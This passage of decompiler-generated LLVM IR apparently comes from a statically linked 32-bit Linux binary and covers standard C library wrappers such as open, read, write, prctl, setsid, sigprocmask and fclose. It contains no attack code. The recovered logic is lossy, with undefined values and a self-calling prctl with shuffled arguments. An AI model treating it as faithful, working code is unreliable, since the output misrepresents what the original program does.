  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80513ec = load i32, i32* @ebx, align 4
  store i32 %v0_80513ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80513ff = call i32 @kill(i32 %v0_80513ec, i32 %tmp4)
  store i32 %v2_80513ff, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_80513ff, -4095
  br i1 %tmp, label %dec_label_pc_8051418, label %dec_label_pc_805140c

dec_label_pc_805140c:                             ; preds = %entry
  %v0_805140c = load i32, i32* %stack_var_-4, align 4
  %v1_805140c = call i32 @__errno_location(i32 %v0_805140c)
  %v0_8051411 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051411 = sub i32 0, %v0_8051411
  %v2_8051413 = inttoptr i32 %v1_805140c to i32*
  store i32 %v1_8051411, i32* %v2_8051413, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051418

dec_label_pc_8051418:                             ; preds = %entry, %dec_label_pc_805140c
  %v0_8051419 = phi i32 [ %v2_80513ff, %entry ], [ -1, %dec_label_pc_805140c ]
  %v2_8051418 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051418, i32* @edx, align 4
  %v2_805141c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805141c, i32* @ebx, align 4
  ret i32 %v0_8051419

; uselistorder directives
  uselistorder i32 %v2_80513ff, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051418, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8051423 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8051427 = sdiv i32 %sext, 16777216
  store i32 %v4_8051427, i32* @ecx, align 4
  %v4_805142b = ptrtoint i8* %arg1 to i32
  %v3_805142f = and i32 %arg2, 64
  %v4_805142f = icmp eq i32 %v3_805142f, 0
  br i1 %v4_805142f, label %dec_label_pc_8051440, label %dec_label_pc_8051434

dec_label_pc_8051434:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8051440

dec_label_pc_8051440:                             ; preds = %entry, %dec_label_pc_8051434
  %v0_8051440 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_8051434 ]
  store i32 %v0_8051440, i32* @edx, align 4
  store i32 %v4_805142b, i32* %ebx.global-to-local, align 4
  %v5_805144b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8051427)
  store i32 %v5_805144b, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805144b, -4095
  br i1 %tmp15, label %dec_label_pc_8051463, label %dec_label_pc_8051457

dec_label_pc_8051457:                             ; preds = %dec_label_pc_8051440
  %v1_8051457 = call i32 @__errno_location(i32 %v0_8051423)
  %v0_805145c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805145c = sub i32 0, %v0_805145c
  %v2_805145e = inttoptr i32 %v1_8051457 to i32*
  store i32 %v1_805145c, i32* %v2_805145e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051463

dec_label_pc_8051463:                             ; preds = %dec_label_pc_8051440, %dec_label_pc_8051457
  %v0_8051466 = phi i32 [ %v5_805144b, %dec_label_pc_8051440 ], [ -1, %dec_label_pc_8051457 ]
  store i32 %v0_8051423, i32* @ebx, align 4
  ret i32 %v0_8051466

; uselistorder directives
  uselistorder i32 %v5_805144b, { 1, 0, 2 }
  uselistorder i32 %v4_8051427, { 1, 0 }
  uselistorder i32 %v0_8051423, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051463, { 1, 0 }
  uselistorder label %dec_label_pc_8051440, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805147b = inttoptr i32 %arg1 to i8*
  %v4_805147b = call i32 @__libc_open(i8* %v3_805147b, i32 577)
  ret i32 %v4_805147b
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051484 = load i32, i32* @edi, align 4
  store i32 %v0_8051484, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805148c = load i32, i32* @ebx, align 4
  %v1_8051494 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8051494 = call i32 @pipe([2 x i32] %v1_8051494)
  store i32 %v0_805148c, i32* @ebx, align 4
  store i32 %v2_8051494, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051494, -4095
  br i1 %tmp, label %dec_label_pc_80514ac, label %dec_label_pc_80514a0

dec_label_pc_80514a0:                             ; preds = %entry
  %v1_80514a0 = call i32 @__errno_location(i32 %v0_805148c)
  %v0_80514a5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80514a5 = sub i32 0, %v0_80514a5
  %v2_80514a7 = inttoptr i32 %v1_80514a0 to i32*
  store i32 %v1_80514a5, i32* %v2_80514a7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80514ac

dec_label_pc_80514ac:                             ; preds = %entry, %dec_label_pc_80514a0
  %v0_80514ad = phi i32 [ %v2_8051494, %entry ], [ -1, %dec_label_pc_80514a0 ]
  %v2_80514b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80514b0, i32* @edi, align 4
  ret i32 %v0_80514ad

; uselistorder directives
  uselistorder i32 %v2_8051494, { 1, 0, 2 }
  uselistorder i32 %v0_805148c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80514ac, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80514b4 = load i32, i32* @edi, align 4
  %v0_80514b5 = load i32, i32* @esi, align 4
  store i32 %v0_80514b5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80514cd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_80514d5 = call i32 @prctl(i32 %v0_80514cd, i32 %v0_80514b5, i32 %v0_80514b4, i32 %tmp6, i32 %arg1)
  store i32 %v0_80514cd, i32* @ebx, align 4
  store i32 %v5_80514d5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_80514d5, -4095
  br i1 %tmp, label %dec_label_pc_80514ed, label %dec_label_pc_80514e1

dec_label_pc_80514e1:                             ; preds = %entry
  %v1_80514e1 = call i32 @__errno_location(i32 %v0_80514cd)
  %v0_80514e6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80514e6 = sub i32 0, %v0_80514e6
  %v2_80514e8 = inttoptr i32 %v1_80514e1 to i32*
  store i32 %v1_80514e6, i32* %v2_80514e8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514ed

dec_label_pc_80514ed:                             ; preds = %entry, %dec_label_pc_80514e1
  %v0_80514ee = phi i32 [ %v5_80514d5, %entry ], [ -1, %dec_label_pc_80514e1 ]
  %v2_80514f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514f0, i32* @esi, align 4
  store i32 %v0_80514b4, i32* @edi, align 4
  ret i32 %v0_80514ee

; uselistorder directives
  uselistorder i32 %v5_80514d5, { 1, 0, 2 }
  uselistorder i32 %v0_80514cd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80514ed, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80514f4 = load i32, i32* @edi, align 4
  store i32 %v0_80514f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051504 = load i32, i32* @ebx, align 4
  %v4_805150c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051504, i32* @ebx, align 4
  store i32 %v4_805150c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805150c, -4095
  br i1 %tmp, label %dec_label_pc_8051524, label %dec_label_pc_8051518

dec_label_pc_8051518:                             ; preds = %entry
  %v1_8051518 = call i32 @__errno_location(i32 %v0_8051504)
  %v0_805151d = load i32, i32* %edi.global-to-local, align 4
  %v1_805151d = sub i32 0, %v0_805151d
  %v2_805151f = inttoptr i32 %v1_8051518 to i32*
  store i32 %v1_805151d, i32* %v2_805151f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051524

dec_label_pc_8051524:                             ; preds = %entry, %dec_label_pc_8051518
  %v0_8051525 = phi i32 [ %v4_805150c, %entry ], [ -1, %dec_label_pc_8051518 ]
  %v2_8051528 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051528, i32* @edi, align 4
  ret i32 %v0_8051525

; uselistorder directives
  uselistorder i32 %v4_805150c, { 1, 0, 2 }
  uselistorder i32 %v0_8051504, { 1, 0 }
  uselistorder label %dec_label_pc_8051524, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805152d = load i32, i32* @esi, align 4
  store i32 %v0_805152d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051545 = load i32, i32* @ebx, align 4
  %v1_805154d = call i32 @int80_syscall(i32 142)
  store i32 %v0_8051545, i32* @ebx, align 4
  store i32 %v1_805154d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805154d, -4095
  br i1 %tmp, label %dec_label_pc_8051565, label %dec_label_pc_8051559

dec_label_pc_8051559:                             ; preds = %entry
  %v1_8051559 = call i32 @__errno_location(i32 %v0_8051545)
  %v0_805155e = load i32, i32* %esi.global-to-local, align 4
  %v1_805155e = sub i32 0, %v0_805155e
  %v2_8051560 = inttoptr i32 %v1_8051559 to i32*
  store i32 %v1_805155e, i32* %v2_8051560, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051565

dec_label_pc_8051565:                             ; preds = %entry, %dec_label_pc_8051559
  %v0_8051566 = phi i32 [ %v1_805154d, %entry ], [ -1, %dec_label_pc_8051559 ]
  %v2_8051565 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051565, i32* @edx, align 4
  %v2_8051568 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051568, i32* @esi, align 4
  ret i32 %v0_8051566

; uselistorder directives
  uselistorder i32 %v1_805154d, { 1, 0, 2 }
  uselistorder i32 %v0_8051545, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8051565, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805156c = load i32, i32* @ebx, align 4
  store i32 %v0_805156c, i32* %stack_var_-4, align 4
  %v1_8051575 = call i32 @setsid(i32 %v0_805156c)
  store i32 %v1_8051575, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051575, -4095
  br i1 %tmp, label %dec_label_pc_805158c, label %dec_label_pc_8051580

dec_label_pc_8051580:                             ; preds = %entry
  %v0_8051580 = load i32, i32* %stack_var_-4, align 4
  %v1_8051580 = call i32 @__errno_location(i32 %v0_8051580)
  %v0_8051585 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051585 = sub i32 0, %v0_8051585
  %v2_8051587 = inttoptr i32 %v1_8051580 to i32*
  store i32 %v1_8051585, i32* %v2_8051587, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805158c

dec_label_pc_805158c:                             ; preds = %entry, %dec_label_pc_8051580
  %v0_805158d = phi i32 [ %v1_8051575, %entry ], [ -1, %dec_label_pc_8051580 ]
  %v2_8051590 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051590, i32* @ebx, align 4
  ret i32 %v0_805158d

; uselistorder directives
  uselistorder i32 %v1_8051575, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805158c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8051595 = load i32, i32* @esi, align 4
  %v4_8051599 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8051599, i32* @ecx, align 4
  %v2_80515a5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80515a5, label %dec_label_pc_80515be, label %dec_label_pc_80515a9

dec_label_pc_80515a9:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_80515be, label %dec_label_pc_80515ae

dec_label_pc_80515ae:                             ; preds = %dec_label_pc_80515a9
  %v1_80515ae = call i32 @__errno_location(i32 %v0_8051595)
  %v1_80515b3 = inttoptr i32 %v1_80515ae to i32*
  store i32 22, i32* %v1_80515b3, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_80515e5

dec_label_pc_80515be:                             ; preds = %dec_label_pc_80515a9, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80515c3 = load i32, i32* @ebx, align 4
  %v7_80515cb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80515c3, i32* @ebx, align 4
  %v1_80515ce = add i32 %v7_80515cb, 4096
  %v2_80515ce = icmp ult i32 %v7_80515cb, -4096
  %v3_80515ce = xor i32 %v7_80515cb, -2147483648
  %v4_80515ce = xor i32 %v1_80515ce, %v7_80515cb
  %v5_80515ce = and i32 %v4_80515ce, %v3_80515ce
  %v6_80515ce = icmp slt i32 %v5_80515ce, 0
  store i1 %v6_80515ce, i1* @of, align 1
  %v7_80515ce = icmp eq i32 %v1_80515ce, 0
  store i32 %v7_80515cb, i32* %esi.global-to-local, align 4
  %v2_80515d5 = or i1 %v2_80515ce, %v7_80515ce
  br i1 %v2_80515d5, label %dec_label_pc_80515e5, label %dec_label_pc_80515d7

dec_label_pc_80515d7:                             ; preds = %dec_label_pc_80515be
  %v1_80515d7 = call i32 @__errno_location(i32 %v0_80515c3)
  %v0_80515dc = load i32, i32* %esi.global-to-local, align 4
  %v1_80515dc = sub i32 0, %v0_80515dc
  %v2_80515de = inttoptr i32 %v1_80515d7 to i32*
  store i32 %v1_80515dc, i32* %v2_80515de, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80515e5

dec_label_pc_80515e5:                             ; preds = %dec_label_pc_80515d7, %dec_label_pc_80515be, %dec_label_pc_80515ae
  %storemerge = phi i32 [ -1, %dec_label_pc_80515ae ], [ %v7_80515cb, %dec_label_pc_80515be ], [ -1, %dec_label_pc_80515d7 ]
  %v2_80515e5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80515e5, i32* @edx, align 4
  store i32 %v0_8051595, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80515ce, { 1, 0 }
  uselistorder i32 %v7_80515cb, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_80515c3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80515ec = load i32, i32* @edi, align 4
  store i32 %v0_80515ec, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80515f4 = load i32, i32* @ebx, align 4
  %v2_80515fc = call i32 @time(i32* %arg1)
  store i32 %v0_80515f4, i32* @ebx, align 4
  store i32 %v2_80515fc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_80515fc, -4095
  br i1 %tmp, label %dec_label_pc_8051614, label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %entry
  %v1_8051608 = call i32 @__errno_location(i32 %v0_80515f4)
  %v0_805160d = load i32, i32* %edi.global-to-local, align 4
  %v1_805160d = sub i32 0, %v0_805160d
  %v2_805160f = inttoptr i32 %v1_8051608 to i32*
  store i32 %v1_805160d, i32* %v2_805160f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051614

dec_label_pc_8051614:                             ; preds = %entry, %dec_label_pc_8051608
  %v0_8051615 = phi i32 [ %v2_80515fc, %entry ], [ -1, %dec_label_pc_8051608 ]
  %v2_8051614 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051614, i32* @edx, align 4
  %v2_8051618 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051618, i32* @edi, align 4
  ret i32 %v0_8051615

; uselistorder directives
  uselistorder i32 %v2_80515fc, { 1, 0, 2 }
  uselistorder i32 %v0_80515f4, { 1, 0 }
  uselistorder label %dec_label_pc_8051614, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805162d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805162d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051638 = load i32, i32* @edi, align 4
  store i32 %v0_8051638, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051648 = load i32, i32* @ebx, align 4
  %v4_8051650 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051648, i32* @ebx, align 4
  store i32 %v4_8051650, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051650, -4095
  br i1 %tmp, label %dec_label_pc_8051668, label %dec_label_pc_805165c

dec_label_pc_805165c:                             ; preds = %entry
  %v1_805165c = call i32 @__errno_location(i32 %v0_8051648)
  %v0_8051661 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051661 = sub i32 0, %v0_8051661
  %v2_8051663 = inttoptr i32 %v1_805165c to i32*
  store i32 %v1_8051661, i32* %v2_8051663, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051668

dec_label_pc_8051668:                             ; preds = %entry, %dec_label_pc_805165c
  %v0_8051669 = phi i32 [ %v4_8051650, %entry ], [ -1, %dec_label_pc_805165c ]
  %v2_8051668 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051668, i32* @edx, align 4
  %v2_805166c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805166c, i32* @edi, align 4
  ret i32 %v0_8051669

; uselistorder directives
  uselistorder i32 %v4_8051650, { 1, 0, 2 }
  uselistorder i32 %v0_8051648, { 1, 0 }
  uselistorder label %dec_label_pc_8051668, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051674 = load i32, i32* inttoptr (i32 134595192 to i32*), align 8
  %v2_8051679 = mul i32 %arg1, 2
  %v3_8051679 = add i32 %v0_8051674, %v2_8051679
  %v4_8051679 = inttoptr i32 %v3_8051679 to i16*
  %v5_8051679 = load i16, i16* %v4_8051679, align 2
  %v6_8051679 = zext i16 %v5_8051679 to i32
  %v1_805167d = and i32 %v6_8051679, 32
  ret i32 %v1_805167d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8051688 = add i32 %arg1, 128
  %v6_8051693 = icmp ugt i32 %v1_8051688, 383
  br i1 %v6_8051693, label %dec_label_pc_805169e, label %dec_label_pc_8051695

dec_label_pc_8051695:                             ; preds = %entry
  %v0_8051695 = load i32, i32* inttoptr (i32 134595200 to i32*), align 128
  %v2_805169a = mul i32 %arg1, 2
  %v3_805169a = add i32 %v0_8051695, %v2_805169a
  %v4_805169a = inttoptr i32 %v3_805169a to i16*
  %v5_805169a = load i16, i16* %v4_805169a, align 2
  %v6_805169a = sext i16 %v5_805169a to i32
  store i32 %v6_805169a, i32* @edx, align 4
  br label %dec_label_pc_805169e

dec_label_pc_805169e:                             ; preds = %entry, %dec_label_pc_8051695
  %v0_805169e = phi i32 [ %arg1, %entry ], [ %v6_805169a, %dec_label_pc_8051695 ]
  ret i32 %v0_805169e

; uselistorder directives
  uselistorder label %dec_label_pc_805169e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8062780.471 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80516ac = load i32, i32* @ebp, align 4
  %v0_80516ad = load i32, i32* @edi, align 4
  %v0_80516ae = load i32, i32* @esi, align 4
  %v0_80516af = load i32, i32* @ebx, align 4
  %v4_80516b3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80516b3, i32* @esi, align 4
  %v1_80516b7 = add i32 %v4_80516b3, 52
  %v2_80516b7 = inttoptr i32 %v1_80516b7 to i32*
  %v3_80516b7 = load i32, i32* %v2_80516b7, align 4
  store i32 %v3_80516b7, i32* @ebp, align 4
  %v1_80516ba = icmp eq i32 %v3_80516b7, 0
  %v1_80516bc = icmp eq i1 %v1_80516ba, false
  br i1 %v1_80516bc, label %dec_label_pc_80516dd, label %dec_label_pc_80516be

dec_label_pc_80516be:                             ; preds = %entry
  %v1_80516be = add i32 %v4_80516b3, 56
  store i32 %v1_80516be, i32* @ebx, align 4
  %v2_80516c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80516c8, i32* @eax, align 4
  %v2_80516cd = call i32 @__pthread_return_void(i32 %v2_80516c8, i32 134566343)
  %v0_80516d2 = load i32, i32* @ebx, align 4
  %v1_80516d5 = call i32 @__pthread_return_0(i32 %v0_80516d2)
  store i32 %v1_80516d5, i32* @eax, align 4
  %v0_80516df.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80516dd

dec_label_pc_80516dd:                             ; preds = %entry, %dec_label_pc_80516be
  %v0_80516e7 = phi i32 [ %v4_80516b3, %entry ], [ %v0_80516df.pre, %dec_label_pc_80516be ]
  store i32 0, i32* @edi, align 4
  %v1_80516df = inttoptr i32 %v0_80516e7 to i8*
  %v2_80516df = load i8, i8* %v1_80516df, align 1
  %v3_80516df = and i8 %v2_80516df, 64
  %v4_80516df = icmp eq i8 %v3_80516df, 0
  br i1 %v4_80516df, label %dec_label_pc_80516dd.dec_label_pc_80516f2_crit_edge, label %dec_label_pc_80516e4

dec_label_pc_80516dd.dec_label_pc_80516f2_crit_edge: ; preds = %dec_label_pc_80516dd
  br label %dec_label_pc_80516f2

dec_label_pc_80516e4:                             ; preds = %dec_label_pc_80516dd
  %v1_80516e8 = inttoptr i32 %v0_80516e7 to i16*
  %v2_80516e8 = call i32 @fflush_unlocked(i16* %v1_80516e8)
  store i32 %v2_80516e8, i32* @edi, align 4
  %v0_80516f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80516f2

dec_label_pc_80516f2:                             ; preds = %dec_label_pc_80516dd.dec_label_pc_80516f2_crit_edge, %dec_label_pc_80516e4
  %v0_80516f5 = phi i32 [ %v0_80516e7, %dec_label_pc_80516dd.dec_label_pc_80516f2_crit_edge ], [ %v0_80516f5.pre, %dec_label_pc_80516e4 ]
  %v1_80516f5 = add i32 %v0_80516f5, 4
  %v2_80516f5 = inttoptr i32 %v1_80516f5 to i32*
  %v3_80516f5 = load i32, i32* %v2_80516f5, align 4
  %v1_80516f8 = call i32 @__libc_close(i32 %v3_80516f5)
  %v0_8051700 = load i32, i32* @esi, align 4
  %v1_8051700 = add i32 %v0_8051700, 4
  %v2_8051700 = inttoptr i32 %v1_8051700 to i32*
  store i32 -1, i32* %v2_8051700, align 4
  %v2_8051711 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8051711, i32* @ebx, align 4
  %v2_8051716 = icmp slt i32 %v1_80516f8, 0
  store i32 -1, i32* @eax, align 4
  %v1_805171d = load i32, i32* @edi, align 4
  %v3_805171d = select i1 %v2_8051716, i32 -1, i32 %v1_805171d
  store i32 %v3_805171d, i32* @edi, align 4
  %v2_8051720 = call i32 @__pthread_return_void(i32 %v2_8051711, i32 134566343)
  %v1_805172c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  %v0_8051731 = load i32, i32* @global_var_8060544.473, align 4
  %v1_8051736 = add i32 %v0_8051731, 1
  store i32 %v1_8051736, i32* @global_var_8060544.473, align 4
  store i32 ptrtoint (i32* @global_var_805c2b4.472 to i32), i32* @eax, align 4
  %v2_8051741 = call i32 @__pthread_return_void(i32 %v2_8051711, i32 1)
  %v0_8051746 = load i32, i32* @esi, align 4
  %v1_8051746 = inttoptr i32 %v0_8051746 to i32*
  %v2_8051746 = load i32, i32* %v1_8051746, align 4
  %v1_805174b = and i32 %v2_8051746, 24576
  %v1_8051750 = or i32 %v1_805174b, 48
  store i32 %v1_8051750, i32* @eax, align 4
  %v1_8051755 = trunc i32 %v1_8051750 to i16
  %v3_8051755 = inttoptr i32 %v0_8051746 to i16*
  store i16 %v1_8051755, i16* %v3_8051755, align 2
  br i1 %v1_80516bc, label %dec_label_pc_805176b, label %dec_label_pc_805175a

dec_label_pc_805175a:                             ; preds = %dec_label_pc_80516f2
  %v2_805175e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805175e, i32* @eax, align 4
  %v2_8051763 = call i32 @__pthread_return_void(i32 %v2_805175e, i32 1)
  store i32 %v2_8051763, i32* @eax, align 4
  br label %dec_label_pc_805176b

dec_label_pc_805176b:                             ; preds = %dec_label_pc_80516f2, %dec_label_pc_805175a
  %v0_805176b = load i32, i32* @esi, align 4
  %v1_805176b = add i32 %v0_805176b, 1
  %v2_805176b = inttoptr i32 %v1_805176b to i8*
  %v3_805176b = load i8, i8* %v2_805176b, align 1
  %v4_805176b = and i8 %v3_805176b, 64
  %v5_805176b = icmp eq i8 %v4_805176b, 0
  br i1 %v5_805176b, label %dec_label_pc_805177f, label %dec_label_pc_8051771

dec_label_pc_8051771:                             ; preds = %dec_label_pc_805176b
  %v1_8051774 = add i32 %v0_805176b, 8
  %v2_8051774 = inttoptr i32 %v1_8051774 to i32*
  %v3_8051774 = load i32, i32* %v2_8051774, align 4
  %v1_8051777 = call i32 @free(i32 %v3_8051774)
  store i32 %v1_8051777, i32* @eax, align 4
  br label %dec_label_pc_805177f

dec_label_pc_805177f:                             ; preds = %dec_label_pc_805176b, %dec_label_pc_8051771
  %v2_805178b = call i32 @__pthread_return_void(i32 %v2_8051711, i32 134566343)
  %v1_8051797 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  store i32 ptrtoint (i32* @global_var_805c2b4.472 to i32), i32* @eax, align 4
  %v0_805179d = load i32, i32* @global_var_8060548.474, align 8
  %v1_805179d = add i32 %v0_805179d, 1
  store i32 %v1_805179d, i32* @global_var_8060548.474, align 8
  %v2_80517a7 = call i32 @__pthread_return_void(i32 %v2_8051711, i32 1)
  %v0_80517ac = call i32 @_stdio_openlist_dec_use()
  %v0_80517b4 = load i32, i32* @edi, align 4
  store i32 %v0_80516af, i32* @ebx, align 4
  store i32 %v0_80516ae, i32* @esi, align 4
  store i32 %v0_80516ad, i32* @edi, align 4
  store i32 %v0_80516ac, i32* @ebp, align 4
  ret i32 %v0_80517b4

; uselistorder directives
  uselistorder i32 %v2_8051711, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_805177f, { 1, 0 }
  uselistorder label %dec_label_pc_805176b, { 1, 0 }
  uselistorder label %dec_label_pc_80516f2, { 1, 0 }
  uselistorder label %dec_label_pc_80516dd, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80517cb = inttoptr i32 %arg2 to i8*
  %v5_80517cb = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80517cb, i32 0, i32 -1)
  ret i32 %v5_80517cb
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80517d7 = ptrtoint i32* %stack_var_12 to i32
